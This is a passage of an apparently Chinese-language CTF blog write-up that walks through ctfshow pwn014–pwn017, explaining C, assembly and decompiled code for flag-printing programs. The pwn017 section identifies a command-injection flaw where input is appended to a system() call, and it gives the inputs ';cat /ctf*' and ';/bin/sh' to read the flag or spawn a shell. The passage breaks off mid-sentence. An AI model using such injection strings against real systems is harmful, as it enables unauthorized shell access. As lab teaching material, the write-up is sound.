class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>arr1</code> 和 <code>arr2</code> 都存储了字符串 “Hello”。因为 <code>'H'</code> 的ASCII值是 <code>72</code>，<code>'e'</code> 的ASCII值是 <code>101</code>，以此类推。最后的 <code>'\0'</code> 或 <code>0</code> 是字符串的结束标记，也就是空字符（null character）。</p><h2 id="二、pwn014-c源代码"><a href="#二、pwn014-c源代码" class="headerlink" title="二、pwn014.c源代码"></a>二、pwn014.c源代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库#include &lt;stdlib.h&gt; // 引入标准库#define BUFFER_SIZE 1024 // 定义缓冲区大小为1024int main() { // 主函数    FILE *fp; // 定义文件指针    unsigned char buffer[BUFFER_SIZE]; // 定义一个大小为BUFFER_SIZE的无符号字符数组作为缓冲区    size_t n; // 定义一个变量n，用于存储读取的字节数    fp = fopen("key", "rb"); // 以二进制读模式打开名为"key"的文件    if (fp == NULL) { // 如果文件打开失败        perror("Nothing here!"); // 打印错误信息        return -1; // 返回-1并结束程序    }    char output[BUFFER_SIZE * 9 + 12]; // 定义一个字符数组用于存储输出的字符串    int offset = 0; // 定义一个偏移量，用于在output数组中添加字符    offset += sprintf(output + offset, "ctfshow{"); // 在output数组的开头添加"ctfshow{"    while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { // 循环读取文件，每次读取BUFFER_SIZE个字节，直到文件结束              for (size_t i = 0; i &lt; n; i++) { // 遍历 每个读取的字节            for (int j = 7; j &gt;= 0; j--) { // 遍历字节的每一位                offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1); // 将字节的每一位转换为二进制并添加到output数组中            }            if (i != n - 1) { // 如果不是最后一个字节                offset += sprintf(output + offset, "_"); // 在字节之间添加"_"            }        }        if (!feof(fp)) { // 如果文件还没有读完            offset += sprintf(output + offset, " "); // 在每个BUFFER_SIZE个字节之间添加" "        }    }    offset += sprintf(output + offset, "}"); // 在output数组的末尾添加"}"    printf("%s\n", output); // 打印output数组    fclose(fp); // 关闭文件    return 0; // 返回0并结束程序}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-指针fp："><a href="#1-指针fp：" class="headerlink" title="1.指针fp："></a>1.指针fp：</h3><p>总结：<code>fp</code> 是用来<strong>操作</strong> “key” 文件的。</p><p><code>fp</code> 是一个文件指针，它在 C 语言中用于操作文件。在这个程序中，<code>fp</code> 被用来打开一个名为 “key” 的文件，并读取其内容。</p><p>在 C 语言中，文件操作的函数（如 <code>fopen</code>，<code>fread</code>，<code>fclose</code> 等）都需要一个文件指针作为参数。这个文件指针指向一个 <code>FILE</code> 结构体，这个结构体包含了文件的所有信息，如文件位置，错误状态等。</p><p>在这个程序中，<code>fp</code> 被用在以下几个地方：</p><ul><li><p><code>fp = fopen("key", "rb");</code>：这行代码打开一个名为 “key” 的文件，并返回一个文件指针，这个文件指针被赋值给 <code>fp</code>。”rb” 表示以二进制读模式打开文件。</p></li><li><p><code>if (fp == NULL) { ... }</code>：这行代码检查 <code>fp</code> 是否为 <code>NULL</code>。如果 <code>fp</code> 为 <code>NULL</code>，说明文件打开失败。</p></li><li><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { ... }</code>：这行代码使用 <code>fread</code> 函数从文件中读取数据。<code>fread</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>if (!feof(fp)) { ... }</code>：这行代码使用 <code>feof</code> 函数检查文件是否已经读到末尾。<code>feof</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>fclose(fp);</code>：这行代码使用 <code>fclose</code> 函数关闭文件。<code>fclose</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li></ul><p>在C语言中，操作文件需要使用文件指针，如<code>fp</code>，主要有以下几个原因：</p><ol><li><p><strong>抽象和封装</strong>：文件指针是一个指向<code>FILE</code>结构体的指针，这个结构体在C语言的标准库中定义。<code>FILE</code>结构体包含了所有关于文件的信息，如文件位置、错误状态、缓冲区等。通过使用文件指针，C语言的标准库可以封装所有的文件操作，使得程序员不需要关心文件操作的底层细节。</p></li><li><p><strong>动态和灵活</strong>：通过使用文件指针，你可以动态地打开、读写和关闭文件。例如，你可以在运行时决定打开哪个文件，或者同时打开多个文件。</p></li><li><p><strong>兼容性</strong>：使用文件指针的文件操作函数（如<code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>等）是C语言标准库的一部分，这意味着它们可以在几乎所有的C语言环境中使用，包括不同的操作系统和硬件平台。</p></li><li><p><strong>错误处理</strong>：如果文件操作失败（例如，试图打开一个不存在的文件），<code>fopen</code>函数会返回<code>NULL</code>，你可以检查文件指针是否为<code>NULL</code>来判断文件操作是否成功。</p></li></ol><p>总的来说，使用文件指针是C语言处理文件的一种高级、抽象、灵活和兼容的方式。</p><h3 id="2-BUFFER-SIZE-9-12和offset"><a href="#2-BUFFER-SIZE-9-12和offset" class="headerlink" title="2.BUFFER_SIZE * 9 + 12和offset"></a>2.BUFFER_SIZE * 9 + 12<code>和</code>offset</h3><p>这段代码的主要目的是将读取到的每个字节转换为二进制形式，并将其存储在<code>output</code>数组中。这里的<code>BUFFER_SIZE * 9 + 12</code>和<code>offset</code>是关键部分，我会详细解释。</p><p>首先，<code>char output[BUFFER_SIZE * 9 + 12];</code>定义了一个字符数组<code>output</code>，用于存储输出的字符串。这个数组的大小是<code>BUFFER_SIZE * 9 + 12</code>，这是因为每个字节（8位）被转换为二进制形式后，需要9个字符的空间（8个字符表示二进制，1个字符表示下划线”_”）。所以，<code>BUFFER_SIZE</code>个字节需要<code>BUFFER_SIZE * 9</code>个字符的空间。另外，字符串的开头有”ctfshow{“（8个字符），末尾有”}”（1个字符），以及可能的空格字符（最多3个），所以总共需要额外的12个字符的空间。</p><p>然后，<code>int offset = 0;</code>定义了一个变量<code>offset</code>，它表示下一个要写入<code>output</code>数组的位置。初始时，<code>offset</code>被设置为0，表示从<code>output</code>数组的开头开始写入。</p><p>接下来，<code>offset += sprintf(output + offset, "ctfshow{");</code>将字符串”ctfshow{“写入<code>output</code>数组，并将<code>offset</code>增加了写入的字符数（即”ctfshow{“的长度，也就是8）。这样，<code>offset</code>就指向了<code>output</code>数组中下一个要写入的位置。</p><p>在接下来的循环中，每个字节的每一位都被转换为二进制形式，并写入<code>output</code>数组。<code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>这行代码做了两件事：一是将字节的一位转换为二进制形式并写入<code>output</code>数组，二是将<code>offset</code>增加了写入的字符数（这里是1，因为一位二进制只需要1个字符的空间）。这样，<code>offset</code>就始终指向了<code>output</code>数组中下一个要写入的位置。</p><p>总的来说，<code>BUFFER_SIZE * 9 + 12</code>是为了确保<code>output</code>数组有足够的空间来存储转换为二进制形式的字节，以及其他的字符。而<code>offset</code>则是用来跟踪<code>output</code>数组中下一个要写入的位置。</p><p>这行代码使用了两个函数：<code>sprintf</code>和<code>+=</code>操作符。我会分别解释它们。</p><h3 id="3、offset-x3D-sprintf-output-offset-“ctfshow-“"><a href="#3、offset-x3D-sprintf-output-offset-“ctfshow-“" class="headerlink" title="3、offset += sprintf(output + offset, “ctfshow{“"></a>3、offset += sprintf(output + offset, “ctfshow{“</h3><ol><li><p><code>sprintf</code>函数：<code>sprintf</code>是C语言中的一个函数，它用于将格式化的数据写入字符串。它的原型是<code>int sprintf(char *str, const char *format, ...);</code>，其中<code>str</code>是目标字符串，<code>format</code>是格式化字符串，<code>...</code>表示可变数量的参数。</p><p>在这个例子中，<code>sprintf(output + offset, "ctfshow{"</code>将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置。<code>output + offset</code>表示<code>output</code>数组的<code>offset</code>位置的指针。这样，”ctfshow{“就被写入了<code>output</code>数组的正确位置。</p><p><code>sprintf</code>函数返回写入的字符数。在这个例子中，”ctfshow{“有8个字符，所以<code>sprintf</code>函数返回8。</p></li><li><p><code>+=</code>操作符：<code>+=</code>是C语言中的一个复合赋值操作符，它将左边的变量增加右边的值。例如，<code>a += b</code>等价于<code>a = a + b</code>。</p><p>在这个例子中，<code>offset += sprintf(output + offset, "ctfshow{"</code>将<code>offset</code>增加了<code>sprintf</code>函数返回的值，也就是写入的字符数。这样，<code>offset</code>就被更新为了<code>output</code>数组中下一个要写入的位置。</p></li><li><p>当我们写<code>output + offset</code>时，我们实际上是在进行指针运算。<code>output</code>是一个指针，它指向<code>output</code>数组的开始位置，<code>offset</code>是一个整数，它表示的是从<code>output</code>数组的开始位置开始的偏移量。所以，<code>output + offset</code>实际上是一个新的指针，它指向<code>output</code>数组中的<code>offset</code>位置。</p></li></ol><p>总的来说，<code>offset += sprintf(output + offset, "ctfshow{"</code>这行代码的作用是将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置，并将<code>offset</code>更新为下一个要写入的位置。</p><h3 id="4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0"><a href="#4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0" class="headerlink" title="4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) > 0)"></a>4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</h3><p>这是一个<code>while</code>循环，它使用<code>fread</code>函数从文件中读取数据。让我们详细解释一下这个函数和循环的工作原理。</p><p><code>fread</code>是一个标准库函数，用于从文件流中读取数据。它的原型如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数有四个参数：</p><ol><li><code>ptr</code>：这是一个指向你想要存储读取数据的内存区域的指针。</li><li><code>size</code>：这是你想要读取的每个数据项的大小，以字节为单位。</li><li><code>nmemb</code>：这是你想要读取的数据项的数量。</li><li><code>stream</code>：这是一个指向你想要读取的文件流的指针。</li></ol><p><code>fread</code>函数会尝试读取<code>nmemb</code>个数据项，每个数据项的大小为<code>size</code>字节，从<code>stream</code>指向的文件流中，然后将读取的数据存储在<code>ptr</code>指向的内存区域。函数返回实际读取的数据项数量。</p><p>在你的代码中，<code>fread</code>函数的调用如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里，<code>buffer</code>是一个指向你想要存储读取数据的内存区域的指针，<code>sizeof(unsigned char)</code>是你想要读取的每个数据项的大小（这里是1字节），<code>BUFFER_SIZE</code>是你想要读取的数据项的数量，<code>fp</code>是一个指向你想要读取的文件流的指针。函数返回实际读取的数据项数量，并将这个数量赋值给<code>n</code>。</p><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</code>这个循环会一直执行，直到<code>fread</code>函数返回的值不大于0，也就是说，直到没有更多的数据可以从文件中读取，或者发生了错误。在每次循环中，都会读取最多<code>BUFFER_SIZE</code>个字节的数据，并将读取的字节数赋值给<code>n</code>。然后，循环体中的代码会处理这些读取的数据。</p><h3 id="5、while循环"><a href="#5、while循环" class="headerlink" title="5、while循环"></a>5、while循环</h3><ol><li><code>for (size_t i = 0; i &lt; n; i++) {</code>：这是外层循环，它遍历每个读取的字节。<code>n</code>是通过<code>fread</code>函数从文件中读取的字节数，所以这个循环会遍历<code>buffer</code>数组中的每个字节。</li><li><code>for (int j = 7; j &gt;= 0; j--) {</code>：这是内层循环，它遍历字节的每一位。因为一个字节由8位（bit）组成，所以这个循环从7开始，到0结束，遍历字节的每一位。</li><li><code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>：这行代码将字节的每一位转换为二进制形式，并将结果添加到<code>output</code>数组中。这里的<code>buffer[i] &gt;&gt; j</code>是将<code>buffer[i]</code>的第<code>j</code>位移动到最右边，然后<code>&amp; 1</code>操作获取这一位的值（0或1）。<code>sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1)</code>将这个值转换为字符串（”0”或”1”），并写入<code>output</code>数组的<code>offset</code>位置。然后，<code>offset</code>被增加了写入的字符数（这里是1），所以它始终指向<code>output</code>数组中下一个要写入的位置。</li></ol><p>总的来说，这段代码是在将每个读取的字节转换为二进制形式，并将这些二进制形式的字节存储在<code>output</code>数组中。这个过程通过两个循环完成：外层循环遍历每个字节，内层循环遍历字节的每一位。</p><h4 id="运算过程："><a href="#运算过程：" class="headerlink" title="运算过程："></a>运算过程：</h4><ul><li>“C”的ASCII码值是67，二进制形式是1000011。</li><li>“T”的ASCII码值是84，二进制形式是1010100。</li><li>“F”的ASCII码值是70，二进制形式是1000110。</li><li>“s”的ASCII码值是115，二进制形式是1110011。</li><li>“h”的ASCII码值是104，二进制形式是1101000。</li><li>“o”的ASCII码值是111，二进制形式是1101111。</li><li>“w”的ASCII码值是119，二进制形式是1110111。</li></ul><p>然后，我们来看这个循环过程。假设我们已经从文件中读取了”CTFshow”，并将其存储在<code>buffer</code>数组中。那么，<code>n</code>就是7，因为”CTFshow”有7个字符。</p><p>在外层循环中，<code>i</code>从0到6，所以<code>buffer[i]</code>就是”CTFshow”的每个字符的ASCII码值。在内层循环中，<code>j</code>从7到0，所以<code>(buffer[i] &gt;&gt; j) &amp; 1</code>就是<code>buffer[i]</code>的每一位的值。然后，这个值被转换为字符串（”0”或”1”），并被添加到<code>output</code>数组中。</p><p>例如，当<code>i</code>是0时，<code>buffer[i]</code>就是”C”的ASCII码值67，它的二进制形式是1000011。在内层循环中，我们将67的每一位的值（从左到右）添加到<code>output</code>数组中，得到”1000011”。</p><p>当我们对”CTFshow”的每个字符都做这个操作后，<code>output</code>数组中就存储了”CTFshow”的二进制形式，即”1000011_1010100_1000110_1110011_1101000_1101111_1110111”。</p><h2 id="三、pwn015汇编源代码"><a href="#三、pwn015汇编源代码" class="headerlink" title="三、pwn015汇编源代码"></a>三、pwn015汇编源代码</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data  ; 数据段，用于声明和初始化一些全局变量    str1 db "CTFshow",0  ; 声明一个字符串变量str1，值为"CTFshow"    str2 db "_3@sy",0    ; 声明一个字符串变量str2，值为"_3@sy"    str3 db "@ss3mb1y",0 ; 声明一个字符串变量str3，值为"@ss3mb1y"    str4 db "_1s",0      ; 声明一个字符串变量str4，值为"_1s"    str5 db "ctfshow{"   ; 声明一个字符串变量str5，值为"ctfshow{"    str6 db "}"          ; 声明一个字符串变量str6，值为"}"section .text  ; 代码段，用于存放程序的代码    global _start  ; 声明一个全局的_start标签，这是程序的入口点_start:  ; 程序的入口点    mov eax, 4  ; 系统调用号4，表示write操作    mov ebx, 1  ; 文件描述符1，表示标准输出stdout    mov ecx, str5  ; 要写入的字符串的地址    mov edx, 8  ; 要写入的字符串的长度    int 0x80  ; 执行系统调用    mov eax, 4  ; 同上，写入str3    mov ebx, 1    mov ecx, str3    mov edx, 8    int 0x80    mov eax, 4  ; 同上，写入str4    mov ebx, 1    mov ecx, str4    mov edx, 3    int 0x80    mov eax, 4  ; 同上，写入str2    mov ebx, 1    mov ecx, str2    mov edx, 5    int 0x80    mov eax, 4  ; 同上，写入str6    mov ebx, 1    mov ecx, str6    mov edx, 1    int 0x80    mov eax, 1  ; 系统调用号1，表示exit操作    xor ebx, ebx  ; 清零ebx，表示退出状态为0    int 0x80  ; 执行系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、pwn16"><a href="#四、pwn16" class="headerlink" title="四、pwn16"></a>四、pwn16</h2><h3 id="汇编源代码"><a href="#汇编源代码" class="headerlink" title="汇编源代码"></a>汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.file"flag.c"  # 指定源代码文件名为"flag.c".text  # 指定接下来的部分为代码段.section.rodata  # 指定接下来的部分为只读数据段.LC0:.string"ctfshow{"  # 定义一个字符串"ctfshow{".text  # 回到代码段.globlctfshow  # 定义一个全局函数ctfshow.typectfshow, @function  # 指定ctfshow的类型为函数ctfshow:  # ctfshow函数的开始.LFB0:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$32, %rsp  # 为局部变量分配空间movq%rdi, -24(%rbp)  # 将函数的第一个参数（%rdi）保存到局部变量中leaq.LC0(%rip), %rdi  # 将字符串"ctfshow{"的地址加载到%rdi中movl$0, %eax  # 将%eax清零，因为printf函数的浮点参数数量是通过%eax传递的callprintf@PLT  # 调用printf函数，打印"ctfshow{"movl$0, -4(%rbp)  # 初始化一个局部变量为0jmp.L2  # 跳转到.L2标签.L3:movl-4(%rbp), %eax  # 将局部变量的值加载到%eax中movslq%eax, %rdx  # 将%eax的值符号扩展后存入%rdxmovq-24(%rbp), %rax  # 将保存的第一个参数的值加载到%rax中addq%rdx, %rax  # 将%rdx和%rax的值相加movzbl(%rax), %eax  # 将%rax指向的字符加载到%eax中，并零扩展movzbl%al, %eax  # 将%al的值零扩展到%eaxmovl%eax, %edi  # 将%eax的值赋给%edicallputchar@PLT  # 调用putchar函数，打印一个字符addl$1, -4(%rbp)  # 将局部变量加1.L2:cmpl$15, -4(%rbp)  # 检查局部变量是否小于等于15jle.L3  # 如果是，跳转到.L3标签movl$125, %edi  # 将字符'}'的ASCII值（125）加载到%edi中callputchar@PLT  # 调用putchar函数，打印字符'}'nop  # 无操作leave  # 恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE0:.sizectfshow, .-ctfshow  # 指定ctfshow函数的大小.section.rodata  # 指定接下来的部分为只读数据段.LC1:.string"%2hhx"  # 定义一个字符串"%2hhx"    .text  # 回到代码段.globlmain  # 定义一个全局函数main.typemain, @function  # 指定main的类型为函数main:  # main函数的开始.LFB1:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$64, %rsp  # 为局部变量分配空间movq%fs:40, %rax  # 从线程局部存储（TLS）中读取栈保护器的值movq%rax, -8(%rbp)  # 将栈保护器的值保存到局部变量中xorl%eax, %eax  # 将%eax清零movabsq$4122593792332543030, %rax  # 将一个64位的常数加载到%rax中movabsq$3834596513518335287, %rdx  # 将另一个64位的常数加载到%rdx中movq%rax, -32(%rbp)  # 将%rax的值保存到局部变量中movq%rdx, -24(%rbp)  # 将%rdx的值保存到局部变量中movl$825635894, -16(%rbp)  # 将一个32位的常数保存到局部变量中movb$0, -12(%rbp)  # 将一个字节的0保存到局部变量中movl$0, -52(%rbp)  # 初始化一个局部变量为0jmp.L5  # 跳转到.L5标签.L6:leaq-48(%rbp), %rdx  # 将一个局部变量的地址加载到%rdx中movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中cltq  # 将%eax的值符号扩展到64位addq%rax, %rdx  # 将%rax和%rdx的值相加movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中addl%eax, %eax  # 将%eax的值加倍leaq-32(%rbp), %rcx  # 将另一个局部变量的地址加载到%rcx中cltq  # 将%eax的值符号扩展到64位addq%rcx, %rax  # 将%rcx和%rax的值相加leaq.LC1(%rip), %rsi  # 将字符串"%2hhx"的地址加载到%rsi中movq%rax, %rdi  # 将%rax的值赋给%rdimovl$0, %eax  # 将%eax清零，因为__isoc99_sscanf函数的浮点参数数量是通过%eax传递的call__isoc99_sscanf@PLT  # 调用__isoc99_sscanf函数，将一个字节的十六进制数转换为字符addl$1, -52(%rbp)  # 将局部变量加1.L5:cmpl$15, -52(%rbp)  # 检查局部变量是否小于等于15jle.L6  # 如果是，跳转到.L6标签leaq-48(%rbp), %rax  # 将一个局部变量的地址加载到%rax中movq%rax, %rdi  # 将%rax的值赋给%rdicallctfshow  # 调用ctfshow函数，打印字符串movl$0, %eax  # 将%eax清零，表示main函数的返回值为0movq-8(%rbp), %rsi  # 将保存的栈保护器的值加载到%rsi中xorq%fs:40, %rsi  # 将%rsi的值与TLS中的栈保护器的值进行异或操作je.L8  # 如果结果为0，跳转到.L8标签call__stack_chk_fail@PLT  # 如果结果不为0，调用__stack_chk_fail函数，表示栈溢出.L8:leave  # 恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE1:.sizemain, .-main  # 指定main函数的大小.ident"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"  # 指定编译器的版本信息.section.note.GNU-stack,"",@progbits  # 指定接下来的部分为GNU堆栈段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反汇编C源代"><a href="#反汇编C源代" class="headerlink" title="反汇编C源代"></a>反汇编C源代</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)  // 主函数{  int i;  // 定义一个整型变量i  char v5[16];  // 定义一个长度为16的字符数组v5  char v6[24];  // 定义一个长度为24的字符数组v6  unsigned __int64 v7;  // 定义一个64位无符号整型变量v7  v7 = __readfsqword(0x28u);  // 从线程局部存储（TLS）中读取栈保护器的值  strcpy(v6, "64616e69756e69756461");  // 将字符串"64616e69756e69756461"复制到v6中  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15  {    argv = (const char **)"%2hhx";  // 将argv指向字符串"%2hhx"    __isoc99_sscanf(&amp;v6[2 * i], "%2hhx", &amp;v5[i]);  // 从v6中读取一个字节的十六进制数，并将其转换为字符存储到v5中  }  ctfshow(v5, argv);  // 调用ctfshow函数，打印v5中的字符串  return 0;  // 返回0}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __fastcall ctfshow(__int64 a1)  // ctfshow函数，参数是一个64位整数a1，表示一个内存地址{  int i;  // 定义一个整型变量i  printf("ctfshow{");  // 打印字符串"ctfshow{"  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15    putchar(*(unsigned __int8 *)(i + a1));  // 从内存地址a1+i处读取一个字符，并打印出来  return putchar(125);  // 打印字符'}'，并返回其ASCII值（125）}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、pwn17"><a href="#五、pwn17" class="headerlink" title="五、pwn17"></a>五、pwn17</h2><h3 id="C源代码"><a href="#C源代码" class="headerlink" title="C源代码"></a>C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 主函数，程序的入口点{  int v4; // 定义一个整型变量v4，用于存储用户的输入  char dest[4]; // 定义一个字符数组dest，大小为4，用于存储命令  char buf[10]; // 定义一个字符数组buf，大小为10，用于存储用户的输入  unsigned __int64 v7; // 定义一个无符号64位整型变量v7  v7 = __readfsqword(0x28u); // 读取FS段寄存器的值，这是一种防止缓冲区溢出的保护机制  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为_IONBF，即不进行缓冲  setvbuf(stdin, 0LL, 1, 0LL); // 设置stdin的缓冲区模式为_IONBF，即不进行缓冲  puts(asc_D48); // 输出字符串asc_D48  puts(asc_DC0); // 输出字符串asc_DC0  puts(asc_E40); // 输出字符串asc_E40  puts(asc_ED0); // 输出字符串asc_ED0  puts(asc_F60); // 输出字符串asc_F60  puts(asc_FE8); // 输出字符串asc_FE8  puts(asc_1080); // 输出字符串asc_1080  puts("    * *************************************                           "); // 输出字符串  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho  puts("    * Type  : Linux_Security_Mechanisms                               "); // 输出字符串  puts("    * Site  : https://ctf.show/                                       "); // 输出字符串  puts("    * Hint  : You should understand the basic command usage of Linux! "); // 输出字符串  puts("    * *************************************                           "); // 输出字符串  *(_DWORD *)dest = 790655852; // 将整数790655852转换为字符数组存储在dest中  v4 = 0; // 初始化v4为0  puts("\nHow much do you know about Linux commands? \n"); // 输出提示信息  while ( 1 ) // 进入无限循环  {    menu(); // 调用menu函数，显示菜单    v4 = 0; // 将v4重置为0    puts("\nEnter the command you want choose:(1.2.3.4 or 5)\n"); // 输出提示信息    __isoc99_scanf("%d", &amp;v4); // 读取用户的输入，存储在v4中    switch ( v4 ) // 根据v4的值执行不同的命令    {      case 1:        system("id"); // 执行id命令，显示当前用户的信息        break;      case 2:        puts("Which directory?('/','./' or the directiry you want?)"); // 输出提示信息        read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中        strcat(dest, buf); // 将buf中的字符串追加到dest中        system(dest); // 执行dest中的命令        puts("Execution succeeded!"); // 输出执行成功的信息        break;      case 3:        sleep(1u); // 等待1秒        puts("$cat /ctfshow_flag"); // 输出字符串        sleep(1u); // 等待1秒        puts("ctfshow{"); // 输出字符串        sleep(2u); // 等待2秒        puts("... ..."); // 输出字符串        sleep(3u); // 等待3秒        puts("Your flag is ..."); // 输出字符串        sleep(5u); // 等待5秒        puts("ctfshow{flag is not here!}"); // 输出字符串        sleep(0x14u); // 等待20秒        puts("wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"); // 输出字符串        sleep(0x1BF52u); // 等待114194秒        system("cat /ctfshow_flag"); // 执行命令，显示flag        break;      case 4:        sleep(2u); // 等待2秒        puts("su: Authentication failure"); // 输出字符串        break;      case 5:        puts("See you!"); // 输出字符串        exit(-1); // 退出程序      default:        puts("command not found!"); // 如果v4的值不是1-5，输出命令未找到的信息        break;    }  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.根据执行的结果，将相应的提示信息赋值给变量 v4。</p><p>2.根据执行的结果，输出相应的提示信息。</p><p>可以看到在选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效</p><p>果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这</p><p>条直接pass，其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限</p><p>制了10字节</p><p>但是我们完全够用，可以构造出 “;cat /ctf*” “;/bin/sh”等</p><p>直接拿取一个shell或者直接读出flag</p><p>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。</p><p>所以cat /ctf*能够读到flag</p><h2 id="3-；bin-x2F-sh（命令注入漏洞产生原因）"><a href="#3-；bin-x2F-sh（命令注入漏洞产生原因）" class="headerlink" title="3.；bin/sh（命令注入漏洞产生原因）"></a>3.；bin/sh（命令注入漏洞产生原因）</h2><p>在这个程序中，用户的输入被直接用于构造并执行系统命令，这是一个典型的命令注入漏洞。</p><p>具体来说，当用户选择选项2并输入一个目录名时，程序会将用户的输入追加到<code>dest</code>字符串中，然后执行<code>system(dest)</code>。<code>system()</code>函数会执行参数中的字符串作为命令。因为程序没有对用户的输入进行任何过滤或检查，所以用户可以输入一些特殊的字符串，如“;cat 